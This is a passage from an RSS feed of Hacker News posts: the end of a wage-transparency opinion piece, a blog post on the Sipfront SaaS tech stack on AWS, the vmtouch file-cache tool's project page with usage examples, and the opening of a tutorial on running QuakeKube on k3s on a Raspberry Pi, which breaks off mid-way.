data-old-src="https://miro.medium.com/max/60/1*uVgy2c4ZV8MuzgXQM1xcoQ.png?q=20"></p></div></div></div></figure><p id="53b6">This feature of the modern workplace is totally avoidable, too. When <a href="https://www.npr.org/sections/money/2015/02/23/385843576/50-years-of-shrinking-union-membership-in-one-map" rel="noopener">unions represented the majority of American workers</a>, there was greater “<a href="https://www.brookings.edu/research/information-is-power-fostering-labor-market-competition-through-transparent-wages/" rel="noopener">familiarity with the distribution of wages in a given market</a>.” In turn, this put “<a href="https://www.brookings.edu/research/information-is-power-fostering-labor-market-competition-through-transparent-wages/" rel="noopener">workers in a stronger position during negotiations</a>”—which could help explain why wage growth was stronger when more people belonged to a union.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1600/1*NZWJ934hjczCSDt0Wx1Qvg.jpeg" width="800" height="459" srcset="https://miro.medium.com/max/552/1*NZWJ934hjczCSDt0Wx1Qvg.jpeg 276w, https://miro.medium.com/max/1104/1*NZWJ934hjczCSDt0Wx1Qvg.jpeg 552w, https://miro.medium.com/max/1280/1*NZWJ934hjczCSDt0Wx1Qvg.jpeg 640w, https://miro.medium.com/max/1400/1*NZWJ934hjczCSDt0Wx1Qvg.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*NZWJ934hjczCSDt0Wx1Qvg.jpeg?q=20"></p></div></div></div></figure><p id="a62f"><a href="https://www.nytimes.com/2018/02/22/us/politics/supreme-court-unions.html" rel="noopener">Unions aren’t coming back</a>, though. So in a post-union economy, how do we empower workers to negotiate for higher wages?</p><p id="939b">Benjamin Harris of Northwestern University has compiled <a href="https://www.brookings.edu/research/information-is-power-fostering-labor-market-competition-through-transparent-wages/" rel="noopener">a report</a> enumerating five remedies to improving wage transparency. Quickly, Harris’ points are:</p><ul><li id="ad8d">Enact state laws to protect workers who discuss pay</li><li id="1dd6">Require large firms to disclose pay trends to the Equal Employment Opportunity Commission</li><li id="ec04">Amend the safe harbor for compensation surveys</li><li id="f822">Change state law to facilitate reciprocal pre-hiring wage disclosure</li><li id="9ce6">Allocate funds for the Department of Labor to study transparency</li></ul><p id="141b">The logic behind these wonky prescriptions is compelling. If businesses are forced to be transparent about wages, they will have a harder time suppressing them. You’d think whether you’re conservative or progressive, that is an outcome worth working towards.</p><p id="05c4">Alas, Republicans have blocked legislation that aims to provide workers with more information on compensation. They have filibustered and condemned the Paycheck Fairness Act—a labor law that, among other provisions, would punish “<a href="http://thehill.com/blogs/floor-action/senate/203064-senate-gop-blocks-paycheck-fairness-bill" rel="noopener">employers for retaliating against workers who share wage information</a>.”</p><p id="7c09">Their arguments against the Act are ridiculous. Ever the critical thinker, Marco Rubio summed up his party’s attitude towards greater wage transparency when he claimed that “<a href="https://thinkprogress.org/marco-rubio-explains-his-opposition-to-equal-pay-law-3c3924506778/" rel="noopener">all [the Paycheck Fairness Act] really did is just help lawyers sue</a>.” Ah, yes. Astute point, Marco.</p><p id="9f61">If history has taught us anything, it is that businesses will not pay people what they are worth until they are forced to. That’s why some employers <a href="https://www.classaction.org/blog/can-i-be-fired-for-discussing-wages-at-work" rel="noopener">retaliate against workers for even <em>discussing</em> wages</a> with each other. So while <a href="https://www.inman.com/2018/03/09/the-week-in-financial-markets-why-arent-wages-growing-faster-in-this-booming-economy/" rel="noopener">everyone</a> <a href="https://www.washingtonpost.com/news/posteverything/wp/2017/10/09/why-arent-wages-growing-more-quickly-a-graphical-analysis/" rel="noopener">keeps</a> <a href="https://www.nationalreview.com/2017/09/growth-stagnant-economists-disagree-reasons-automation-offshoring-demographic-change/" rel="noopener">asking</a> “<a href="http://theweek.com/articles/760002/why-arent-wages-growing-faster" rel="noopener">why aren’t wages growing</a>?,” keep in mind that there is a <em>very simple fix</em> which could improve workers’ bargaining position.</p><p id="1f13">Enforcing greater wage transparency is not a silver bullet. It’s not going to completely erase all wage stagnation. But it is a powerful remedy to a labor market that favors the employer. If Americans want to see bigger paychecks, they should start by figuring out what their coworkers are making.</p><p id="64c2">Think about <em>that</em> the next time you ask for a raise.</p></div></div></div>]]>
            </description>
            <link>https://civicskunk.works/ask-your-coworkers-what-they-make-youll-earn-more-46efb2daf63e</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197935</guid>
            <pubDate>Tue, 24 Nov 2020 12:44:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yet another one-man SaaS technology stack]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197922">thread link</a>) | @agranig
<br/>
November 24, 2020 | https://www.sipfront.com/blog/2020/11/the-technology-stack-behind-sipfront/ | <a href="https://web.archive.org/web/*/https://www.sipfront.com/blog/2020/11/the-technology-stack-behind-sipfront/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <div>
        <div>
          <div>

    
        <div>

          


<article>
  <header>
    
    <p>
    <b>
<time datetime="2020-11-24T12:32:37+01:00">Tue Nov 24, 2020</time> by Andreas Granig
 in 
&nbsp;<a href="https://www.sipfront.com/blog/categories/engineering/" rel="category tag">Engineering</a>


&nbsp;<a href="https://www.sipfront.com/blog/tags/technology-stack/" rel="tag">technology stack</a>, <a href="https://www.sipfront.com/blog/tags/sipp/" rel="tag">sipp</a>, <a href="https://www.sipfront.com/blog/tags/perl/" rel="tag">perl</a>, <a href="https://www.sipfront.com/blog/tags/aws/" rel="tag">aws</a>, <a href="https://www.sipfront.com/blog/tags/behind-the-scenes/" rel="tag">behind the scenes</a>


    </b>
    </p>
  </header>
  

<p>Since several people have asked me about the technology behind Sipfront, I’d
like to shed some light behind the scenes on the tech stack currently used to
drive the service. Sipfront is currently a one man show, therefore it’s
important to keep everything as simple as possible.</p>

<p>I tried to balance the technology stack in a way to finally use new stuff I
wanted to play with since a long time while still being able to move very
quickly.</p>

<h2 id="off-to-the-cloud">Off to the cloud!</h2>

<p>In the past, I used to self-host as many services as possible. RDBMS,
Key/Value Stores, Message Queues, Email delivery, even VM Infrastructure, since
it’s just an <em>apt-get</em> away. With all the flexibility and freedom in adapting
the services to your needs comes the setup time in the short run (which
fortunately is rather small in lots of cases if you’ve worked with those
services in the past), but more importantly maintenance time in the mid- to
long-run. Software updates, backups, tweaking, scaling, you name it.</p>

<p>This time around, I rather forced myself to using hosted services as much as
possible to focus on the actual Sipfront service development instead of herding
the backend infrastructure. You might argue that this comes with a huge cost,
but then again while you don’t have tens of thousands of users, the costs are
quite contained, and the value of my time spent on implementing the service is
by far out-performing the cost of maintaining backend software. Eventually, when
profits are high enough to cover the cost of dedicated DevOps engineers, we
might optimize infrastructure costs by moving it off the cloud. The important
aspect here is to not lock the technology too much into a specific platform,
which actually is quite hard when looking at the compelling tools they provide.
See below.</p>

<h2 id="the-architecture">The architecture</h2>

<p>Based on the chosen cloud approach, I deployed the service on Amazon
AWS. The high level design is shown in the picture below.</p>

<p><img src="https://www.sipfront.com/blog/img/sipfront-hld.png" alt="High Level Design"></p>

<p>The key take-away is that all services are deployed as Docker containers in AWS
Fargate. While Fargate has its annoying restrictions and limitations like for
instance not being able to set ulimits for the number of open files (important
when opening lots of sockets on a container) or setting net_admin privileges
(required if you want to gather per-port traffic statistics using iptables log
rules), it’s simple enough to do its job for now. At a later stage we might
migrate to Kubernetes to get more control over the containers, but taking into
account that I didn’t have too much experience running this kind of
infrastructure, it would have been way of an overkill to start off.</p>

<p>So essentially the workflow of a test session looks like this:</p>

<ol>
<li><p>A user starts a test session on app.sipfront.com using the dashboard.</p></li>

<li><p>The test session is created on the sipfront-app service providing the
dashboard, and its configuration is persisted in the Postgres database
acting as main datasource.</p></li>

<li><p>The session is dispatched to a worker queue and is picked up by a
sipfront-worker instance from there</p></li>

<li><p>The worker instance creates an AWS StepFunction state machine, if
necessary provisions the AWS VPC elements for networking and the Fargate Task
Definition for the containers and triggers the start of the state machine.</p></li>

<li><p>The StepFunction state machine launches the containers which include the
traffic generation tools.</p></li>

<li><p>Once running, the containers fetch their auxiliary files like xml scenarios,
credential files etc. from the sipfront-api instances and publish their
states via MQTT to the AWS MQ.</p></li>

<li><p>The traffic generation tools launch according to the test configuration and
publish their metrics via MQTT.</p></li>

<li><p>The sipfront-persistor instance picks up published metrics from the message
queue and persist them into the main DB.</p></li>

<li><p>On the dashboard, the sipfront-app instance polls for new metrics of the test
session via a websocket connection and paints them on the report page by
updating graphs and tables.</p></li>

<li><p>Once the traffic generation tools end, they wind down the container
instances by notifying their peers via MQTT, and the Fargate cluster is
cleaned up.</p></li>
</ol>

<h2 id="web-technologies">Web technologies</h2>

<p>All components except for the traffic generation tools are written in Perl. This
might sound a bit ancient, but it’s the programming language I know best and
which I’m using most since 20 years, so I get things done very quickly.</p>

<p>Web components like sipfront-app and sipfront-api are created using the
<a href="https://mojolicious.org/">Mojolicious Framework</a>, while the main website is
served as static files stitched together using the <a href="http://www.template-toolkit.org/">Perl Template Toolkit</a> to avoid redundant HTML code for different
pages. This blog section right here is powered by <a href="https://gohugo.io/">Hugo</a> to
generate static pages from Markdown content.</p>

<p>The web containers are then exposed via AWS Load Balancers, which also handle
the TLS certificates.</p>

<h2 id="voip-technologies">VoIP technologies</h2>

<p>The traffic generation tool currently in use is <a href="https://github.com/SIPp/sipp">SIPp</a> with custom patches for MQTT support, while the
service is built in a way that any tool able to run in a Docker container and
publishing its metrics via MQTT can be used.</p>

<p>SIPp is extremely powerful if used properly and can generate a huge amount of
signaling traffic.</p>

<p>The media generation to support audio and video streams and being able to gather
the audio quality is currently in the build stage at the time of writing. The
tools used here will be <a href="https://www.kamailio.org/">Kamailio</a> as a control daemon
for <a href="https://github.com/sipwise/rtpengine">rtpengine</a>, which can be used to
inject media into the calls.</p>

<h2 id="deployment-strategies">Deployment strategies</h2>

<p>Since all components are deployed in AWS and are running in Docker containers,
I’ve built a CI/CD pipeline using AWS CodePipeline.</p>

<p>I’m keeping the git main branch of the various components, which reside in
private Github repositories, clean and production ready, so each push to main on
Github will trigger via a web hook the corresponding AWS CodePipeline code.</p>

<p>The pipeline is then invoking a Source step fetching the source code, a Build
step creating the Docker container and pushing it towards the AWS ECR, and a
Deploy stage to replace the Fargate task with a new one based on the newly
created container.</p>

<h2 id="observability">Observability</h2>

<p>At the moment, I use AWS CloudWatch to collect and present all container logs
and metrics. This is probably the biggest source of improvement to tackle next,
as it’s really clumsy and is not providing all metrics one would expect (load,
anyone?). Therefore I’m leaning to a Prometheus based solution here in the near
term.</p>

<h2 id="infrastructure-as-code">Infrastructure as code</h2>

<p>I’m currently working on packing the whole infrastructure into AWS
CloudFormation definitions, so I can easily spin up completely new instances of
the full stack. This is important for me to have development, staging and
production environments cleanly separated.</p>

<p>This concludes the peek <em>behind the scenes</em> and sheds some lights on how
Sipfront is built. If you have any comments and suggestions, let me know at
<a href="https://twitter.com/andreasgranig">Twitter</a>.</p>

</article> 



        </div>

        


    

	      </div>
	    </div>
	  </div>
	</div></div>]]>
            </description>
            <link>https://www.sipfront.com/blog/2020/11/the-technology-stack-behind-sipfront/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197922</guid>
            <pubDate>Tue, 24 Nov 2020 12:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vmtouch – The Virtual Memory Toucher]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197904">thread link</a>) | @gjvc
<br/>
November 24, 2020 | https://hoytech.com/vmtouch/ | <a href="https://web.archive.org/web/*/https://hoytech.com/vmtouch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        

        

<h2>Portable file system cache diagnostics and control</h2>

<ul>
<li><a href="https://github.com/hoytech/vmtouch">Download from github</a></li>
<li><a href="https://github.com/hoytech/vmtouch/blob/master/vmtouch.pod">Read the online manual</a></li>
</ul>

<p><strong>vmtouch</strong> is a tool for learning about and controlling the file system cache of unix and unix-like systems. It is BSD licensed so you can basically do whatever you want with it.</p>

<h2>Quick install guide:</h2>

<pre><code>$ git clone https://github.com/hoytech/vmtouch.git
$ cd vmtouch
$ make
$ sudo make install
</code></pre>

<h2>What is it good for?</h2>

<ul>
<li>Discovering which files your OS is caching</li>
<li>Telling the OS to cache or evict certain files or regions of files</li>
<li>Locking files into memory so the OS won't evict them</li>
<li>Preserving virtual memory profile when failing over servers</li>
<li>Keeping a "hot-standby" file-server</li>
<li>Plotting filesystem cache usage over time</li>
<li>Maintaining "soft quotas" of cache usage</li>
<li>Speeding up batch/cron jobs</li>
<li>And much more...</li>
</ul>

<h2>Support</h2>

<p>To complement the open source community, Hoytech offers services related to vmtouch:</p>

<ul>
<li>Advanced feature development</li>
<li>Support contracts</li>
<li>Training sessions</li>
</ul>

<p>Please <a href="mailto:doug@hoytech.com?subject=vmtouch%20support">contact Doug Hoyte</a> for more information.</p>

<h2>Examples</h2>

<h3>Example 1</h3>

<p>How much of the /bin/ directory is currently in cache?</p>

<pre><code>$ vmtouch /bin/
           Files: 92
     Directories: 1
  Resident Pages: 348/1307  1M/5M  26.6%
         Elapsed: 0.003426 seconds
</code></pre>

<h3>Example 2</h3>

<p>How much of <em>big-dataset.txt</em> is currently in memory?</p>

<pre><code>$ vmtouch -v big-dataset.txt
big-dataset.txt
[                                                            ] 0/42116

           Files: 1
     Directories: 0
  Resident Pages: 0/42116  0/164M  0%
         Elapsed: 0.005182 seconds
</code></pre>

<p>None of it. Now let's bring part of it into memory with <strong>tail</strong>:</p>

<pre><code>$ tail -n 10000 big-dataset.txt &gt; /dev/null
</code></pre>

<p>Now how much?</p>

<pre><code>$ vmtouch -v big-dataset.txt
big-dataset.txt
[                                                    oOOOOOOO] 4950/42116

           Files: 1
     Directories: 0
  Resident Pages: 4950/42116  19M/164M  11.8%
         Elapsed: 0.006706 seconds
</code></pre>

<p>vmtouch tells us that 4950 pages at the end of the file are now resident in memory.</p>

<h3>Example 3</h3>

<p>Let's <strong>touch</strong> the rest of /big-dataset.txt/ and bring it into memory (pressing enter a few times to illustrate the animated progress bar you will see on your terminal):</p>

<pre><code>$ vmtouch -vt big-dataset.txt
big-dataset.txt
[OOo                                                 oOOOOOOO] 6887/42116
[OOOOOOOOo                                           oOOOOOOO] 10631/42116
[OOOOOOOOOOOOOOo                                     oOOOOOOO] 15351/42116
[OOOOOOOOOOOOOOOOOOOOOo                              oOOOOOOO] 19719/42116
[OOOOOOOOOOOOOOOOOOOOOOOOOOOo                        oOOOOOOO] 24183/42116
[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo                  oOOOOOOO] 28615/42116
[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo              oOOOOOOO] 31415/42116
[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo      oOOOOOOO] 36775/42116
[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo  oOOOOOOO] 39431/42116
[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO] 42116/42116

           Files: 1
     Directories: 0
   Touched Pages: 42116 (164M)
         Elapsed: 12.107 seconds
</code></pre>

<h3>Example 4</h3>

<p>We have 3 big datasets, <em>a.txt</em>, <em>b.txt</em>, and <em>c.txt</em> but only 2 of them will fit in memory at once. If we have <em>a.txt</em> and <em>b.txt</em> in memory but would now like to work with <em>b.txt</em> and <em>c.txt</em>, we could just start loading up <em>c.txt</em> but then our system would evict pages from both <em>a.txt</em> (which we want) and <em>b.txt</em> (which we don't want).</p>

<p>So let's give the system a hint and <strong>evict</strong> <em>a.txt</em> from memory, making room for <em>c.txt</em>:</p>

<pre><code>$ vmtouch -ve a.txt
Evicting a.txt

           Files: 1
     Directories: 0
   Evicted Pages: 42116 (164M)
         Elapsed: 0.076824 seconds
</code></pre>

<h3>Example 5</h3>

<p><strong>Daemonise</strong> and <strong>lock</strong> all files in a directory into physical memory:</p>

<pre><code>vmtouch -dl /var/www/htdocs/critical/
</code></pre>

<h2><a name="saying"></a> What other people are saying</h2>

<p>People have found lots of uses for vmtouch over the years. Here are a few links in no particular order:</p>

<h3>Articles</h3>

<ul>
<li><strong><a href="https://www.hostingadvice.com/blog/vmtouch-delivers-file-system-cache-diagnostics/">FEATURED: Hosting Advice: Interview with Doug about vmtouch</a></strong></li>
<li><a href="http://www.admin-magazine.com/Articles/Tuning-Your-Filesystem-s-Cache">Admin magazine: Performance Tuning Dojo: Tune-Up</a></li>
<li><a href="http://blog.parse.com/learn/engineering/techniques-for-warming-up-mongodb/">Techniques for Warming Up a MongoDB Secondary</a></li>
<li><a href="http://www.inmotionhosting.com/support/website/server-usage/linux-check-memory-usage">Linux Memory Usage</a></li>
<li><a href="http://marek.vavrusa.com/c/memory/2015/02/20/memory/">What a C programmer should know about memory</a></li>
<li><a href="http://www.slideshare.net/JimmyMrdell/playlists-at-spotify-cassandra-summit-london-2013#slide32">Playlists at Spotify - Using Cassandra to store version controlled objects</a> (slide 32)</li>
<li><a href="http://careers.directi.com/display/tu/Understanding+and+optimizing+Memory+utilization">Understanding and optimizing Memory utilization</a></li>
<li><a href="http://www.admon.org/system-tuning/vmtouch-file-system-cache-diagnostics-and-control/">admon.org</a></li>
<li><a href="http://thewebdev.de/vmtouch-virtual-memory-touch/">thewebdev.de</a></li>
<li><a href="http://www.trevoroconnell.com/2012/02/tune-up-paging-with-vmtouch.html">Tune Up Paging with vmtouch</a></li>
<li><a href="http://www.jothirams.com/linux-cached-memory/">Linux Cached Memory</a></li>
<li><a href="http://fulmicoton.com/posts/pagecache/">Of how much of a file is in RAM</a></li>
<li><a href="http://blog.armcd.co.uk/2012/05/manipulating-the-kernels-page-cache-with-vmtouch.html">Manipulating the kernel's page cache with vmtouch</a></li>
<li><a href="http://www.slideshare.net/e1coyot/memory-management-in-linux-kernel">Memory management in Linux kernel</a> (slide 16)</li>
<li><a href="http://radar.oreilly.com/2013/12/supercomputing-on-the-cheap-with-parallella.html">Supercomputing on the cheap with Parallella</a></li>
<li><a href="http://prismoskills.appspot.com/lessons/System_Design_and_Big_Data/Chapter_06_-_System_Design.jsp">System Design and Big Data, chapter 6</a></li>
<li><a href="http://issuu.com/lucidimagination12/docs/gaikaiwari_sudarshan_-_lucene_yelp_lucene_revoluti">Lucene @ Yelp</a> (slide 16)</li>
<li><a href="http://tuxdiary.com/2016/01/26/vmtouch/">tuxdiary: vmtouch: portable file cache analyzer</a></li>
</ul>

<h3>Real-world sightings</h3>

<ul>
<li><a href="http://www.gossamer-threads.com/lists/linux/kernel/1693344">Linux kernel mailing list: zcache: Support zero-filled pages more efficiently</a></li>
<li><a href="http://comments.gmane.org/gmane.comp.db.sqlite.general/79457">comp.db.sqlite.general: Strange eviction from Linux page cache</a></li>
<li><a href="http://blog.binchen.org/posts/emacs-speed-up-1000.html">Emacs speed up 1000%</a></li>
<li><a href="https://lwn.net/Articles/580335/">Jolla Review: Some Rough Edges, But This Linux Smartphone Shows Promise</a> (vmtouch deployed on maemo phones?)</li>
<li><a href="http://lists.ceph.com/pipermail/ceph-users-ceph.com/2014-October/043509.html">ceph-users: Ceph SSD array with Intel DC S3500's</a></li>
<li><a href="http://forum.proxmox.com/archive/index.php/t-16798.html">proxmox forums: CPU Performance Degradtion</a></li>
<li><a href="https://confluence.aps.anl.gov/display/howtos/Evicting+data+from+filesystem+cache">Argonne National Laboratory's Advanced Photon Source</a></li>
<li><a href="https://discuss.elastic.co/t/dealing-with-os-page-cache-evictions/21974/5">Elastic Search: Dealing with OS page cache evictions?</a></li>
<li><a href="http://th30z.blogspot.ca/2012/06/data-center-deploy-using-torrent-and.html">Data-center deploy using torrent and mlock()</a></li>
<li><a href="http://forum.xbian.org/archive/index.php/thread-764.html">Making best use of 512mb Pi with tmpfs</a></li>
<li><a href="https://groups.google.com/d/msg/redis-db/zaLGF1Bit0A/QsVGMJtTpKEJ">redis-db: Issue with Redis replication while transferring rdb file from master to slave</a></li>
<li><a href="http://qnalist.com/questions/5278241/oplog-memory-consumption">mongodb-user: Oplog Memory Consumption</a></li>
<li><a href="https://bugs.centos.org/view.php?id=7091">CentOS bugtracker: oom killer kills process rather than freeing cache</a></li>
<li><a href="http://www.openldap.org/lists/openldap-technical/201511/msg00022.html">LMDB mailing list</a></li>
<li>Used to optimize <a href="https://sportcrypt.com/">ethereum sports betting</a></li>
</ul>

<h3>Instagram</h3>

<p>Discussion about instagram's usage of vmtouch:</p>

<ul>
<li><a href="http://instagram-engineering.tumblr.com/post/13649370142/what-powers-instagram-hundreds-of-instances">What Powers Instagram: Hundreds of Instances, Dozens of Technologies</a></li>
<li><a href="http://highscalability.com/blog/2011/12/6/instagram-architecture-14-million-users-terabytes-of-photos.html">Instagram Architecture: 14 Million Users, Terabytes Of Photos, 100s Of Instances, Dozens Of Technologies</a></li>
<li><a href="http://highscalability.com/blog/2012/4/9/the-instagram-architecture-facebook-bought-for-a-cool-billio.html">The Instagram Architecture Facebook Bought For A Cool Billion Dollars</a></li>
<li><a href="https://gist.github.com/mikeyk/1424540">parse_vmtouch.py</a> (script used by instagram)</li>
</ul>

<h3>Stack-overflow and friends</h3>

<ul>
<li><a href="http://stackoverflow.com/questions/7118543/does-the-linux-filesystem-cache-files-efficiently">Does the Linux filesystem cache files efficiently?</a></li>
<li><a href="http://stackoverflow.com/questions/23048001/postgresql-doesnt-use-memory-for-caching">Postgresql doesn't use memory for caching</a></li>
<li><a href="http://stackoverflow.com/questions/19995756/mongodb-numa-hardware-page-faults-but-enough-ram-for-working-set-touch-comman">MongoDB, NUMA hardware, page faults</a></li>
<li><a href="http://stackoverflow.com/questions/23662322/know-programs-in-cache">Know programs in cache</a></li>
<li><a href="http://serverfault.com/questions/278454/is-it-possible-to-list-the-files-that-are-cached">Is it possible to list the files that are cached?</a></li>
<li><a href="http://serverfault.com/questions/406308/tell-the-linux-kernel-to-put-a-file-in-the-disk-cache">Tell the linux kernel to put a file in the disk cache?</a></li>
<li><a href="http://serverfault.com/questions/408614/securely-wipe-an-entire-linux-server-with-itself">Securely wipe an entire Linux server with itself</a></li>
<li><a href="http://serverfault.com/questions/43383/caching-preloading-files-on-linux-into-ram">Caching/preloading files on Linux into RAM</a></li>
<li><a href="http://serverfault.com/questions/597115/why-drop-caches-in-linux">Why drop caches in Linux?</a></li>
<li><a href="http://serverfault.com/questions/435635/clear-flush-cached-memory">Clear / Flush cached memory</a></li>
<li><a href="http://serverfault.com/questions/504193/limit-filesystem-cache-size-for-specific-files-under-linux">limit filesystem cache size for specific files under linux</a></li>
<li><a href="http://serverfault.com/questions/592907/memory-mapping-files-for-a-blazing-fast-webserver-on-linux">Memory mapping files for a blazing fast webserver on Linux</a></li>
<li><a href="http://serverfault.com/questions/590124/performance-difference-between-ramfs-and-tmpfs">Performance difference between ramfs and tmpfs</a></li>
<li><a href="http://unix.stackexchange.com/questions/203920/how-do-i-lock-a-growing-directory-in-memory">How do I lock a growing directory in memory?</a></li>
<li><a href="http://unix.stackexchange.com/questions/215202/how-do-i-vmtouch-a-directory-not-the-files-it-contains">How do I vmtouch a directory (not the files it contains)?</a> (good question, I don't know of a userspace way to do this)</li>
<li><a href="http://dba.stackexchange.com/questions/64925/mysql-queries-are-10-to-100-times-slower-after-os-reboot">MySQL queries are 10 to 100 times slower after OS reboot</a></li>
<li><a href="http://www.quora.com/How-can-one-examine-what-files-are-in-Linuxs-page-cache">How can one examine what files are in Linux's page cache?</a></li>
</ul>

<h3>OS packages/ports</h3>

<ul>
<li><a href="https://admin.fedoraproject.org/pkgdb/package/vmtouch/">Fedora Linux</a></li>
<li><a href="https://software.opensuse.org//download.html?project=utilities&amp;package=vmtouch">RHEL/OpenSUSE/SLE</a></li>
<li><a href="http://www.freshports.org/sysutils/vmtouch/">FreeBSD</a></li>
<li><a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=672696">Debian</a> (stalled)</li>
<li><a href="https://aur.archlinux.org/packages/vmtouch/">Arch Linux</a></li>
<li><a href="https://packages.gentoo.org/packages/dev-util/vmtouch">Gentoo Linux</a></li>
<li><a href="https://launchpad.net/~pg-radadia/+archive/ubuntu/vmtouch">Ubuntu PPA</a></li>
</ul>

<h3>Non-english</h3>

<ul>
<li>Spanish: <a href="http://blog.renzocolnago.com/as-tecnologias-que-rodam-o-instagram/">1</a></li>
<li>French: <a href="http://www.gcu-squad.org/2012/04/u-cant-vmtouch-this/">1</a> <a href="https://wiki.koumbit.net/VmTouch">2</a></li>
<li>Chinese: <a href="http://blog.chinaunix.net/uid-20662820-id-3480240.html">1</a> <a href="http://blog.sina.com.cn/s/blog_56c9b55c0101195u.html">2</a> <a href="http://www.damndigital.com/archives/39684">3</a> <a href="http://blog.yufeng.info/archives/1903">4</a> <a href="http://anykoro.sinaapp.com/2012/11/25/ramdisk-vmtouch-and-mlock/">5</a> <a href="http://xiezhenye.com/2013/05/mongodb-%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8.html">6</a></li>
<li>Russian: <a href="http://users.livejournal.com/_winnie/353678.html">1</a> <a href="http://habrahabr.ru/company/yandex/blog/231957/">2</a> <a href="http://bulimov.ru/it/meminfo-visualizer/">3</a></li>
<li>Polish: <a href="https://nfsec.pl/root/4694">1</a></li>
</ul>

<h3>Misc</h3>

<ul>
<li><a href="https://www.openhub.net/p/vmtouch">OpenHub</a></li>
<li><a href="https://github.com/uhub/awesome-c">Awesome C directory</a></li>
<li><a href="http://thefiringline.com/library/compsec.html">Computer Security Resources</a></li>
</ul>

<h3>Other tools</h3>

<ul>
<li><a href="https://code.google.com/p/linux-ftools/">linux-ftools</a></li>
<li><a href="https://github.com/caisonglu/cachemaster">cachemaster</a> (inspired by vmtouch)</li>
<li><a href="https://github.com/tobert/pcstat">pcstat</a></li>
<li><a href="https://github.com/datenwolf/fmlock">fmlock</a></li>
<li><a href="https://github.com/Feh/nocache/">nocache</a></li>
<li><a href="http://manpages.ubuntu.com/manpages/ureadahead.8.html">ureadahead</a></li>
</ul>

<p>There are also lots of mentions on twitter using the <a href="https://twitter.com/hashtag/vmtouch">#vmtouch</a> hash-tag</p>

<p>Have another link? Please <a href="https://hoytech.com/about">let me know</a>!</p>

<h2>Author</h2>

<p>vmtouch is copyright (c) 2009-2017 Doug Hoyte and contributors.</p>

<p>Contributors are listed in <a href="https://github.com/hoytech/vmtouch/blob/master/CHANGES">CHANGES</a>.</p>

      </div></div>]]>
            </description>
            <link>https://hoytech.com/vmtouch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197904</guid>
            <pubDate>Tue, 24 Nov 2020 12:39:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quake III Arena, K3s and a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197850">thread link</a>) | @alexellisuk
<br/>
November 24, 2020 | https://johansiebens.dev/posts/2020/11/quake-iii-arena-k3s-and-a-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://johansiebens.dev/posts/2020/11/quake-iii-arena-k3s-and-a-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<figure>
    <img src="https://johansiebens.dev/uploads/2020-11-22/quake_iii_arena_.png"> 
</figure>


<p>Yesterday I saw this tweet of Chris Campbell passing by in my timeline:</p>



<p>Aah, the memories. Quake III Arena, one of my favourite first-person shooter games.</p>

<p>Years ago, I spent (and lost) so much time playing this fast-paced game with friends and foes, and now it is brought into the world of containers and Kubernetes with <strong><a href="https://github.com/criticalstack/quake-kube" target="_blank">QuakeKube</a></strong> by <a href="https://twitter.com/CapitalOneTech" target="_blank">Capital One Tech</a>.</p>

<blockquote>
<p><em>QuakeKube is a Kubernetes-ified version of</em> <a href="https://github.com/inolen/quakejs" target="_blank"><em>QuakeJS</em></a> <em>that runs a dedicated</em> <a href="https://en.wikipedia.org/wiki/Quake_III_Arena" target="_blank"><em>Quake 3</em></a> <em>server in a Kubernetes Deployment, and then allow clients to connect via QuakeJS in the browser.</em></p>
</blockquote>

<p>Of course, I couldn’t wait to give it a try, especially after reading the documentation, saying:</p>

<blockquote>
<p><em>Container images are being cross-compiled with</em> <a href="https://docs.docker.com/buildx/working-with-buildx/" target="_blank"><em>Docker Buildx</em></a> <em>so it can run on hardware with different architectures and operating systems. Currently, it is building for <code>linux/amd64</code> and <code>linux/arm64</code>.</em></p>
</blockquote>

<p><strong>ARM64 support!</strong> Great, it means I can run it on one of my Raspberry Pis!</p>

<h2 id="let-s-get-fragging">Let’s get fragging!</h2>

<p>Most of the work is already done by others, so with the proper tools and projects, it will take you only a few minutes to get everything up and running.</p>

<h3 id="prerequisites">Prerequisites</h3>

<ul>
<li>a Raspberry Pi with Ubuntu 20.04, which supports arm64<br></li>
<li><code>k3sup</code>, a light-weight utility to get from zero to KUBECONFIG with k3s on any local or remote VM.<br></li>
<li><code>arkade</code>, a simple Golang CLI with strongly-typed flags to install charts and apps to your cluster in one command.<br></li>
<li><code>kubectl</code><br></li>
<li>a DigitalOcean account and an API Token</li>
</ul>

<h3 id="installation">Installation</h3>

<p>First, install <code>k3s</code> on your Raspberry Pi running a arm64 OS like Ubuntu 20.04</p>
<div><pre><code data-lang="bash">$ k3sup install --ip <span>192</span>.168.0.52 --user ubuntu --k3s-extra-args <span>'--no-deploy servicelb --no-deploy traefik'</span></code></pre></div>
<p>After the installation of k3s on the Raspberry Pi, k3sup also downloads the required kubeconfig file in your current working directory.<br>
Make sure to configure <code>kubectl</code> to use this config file:</p>
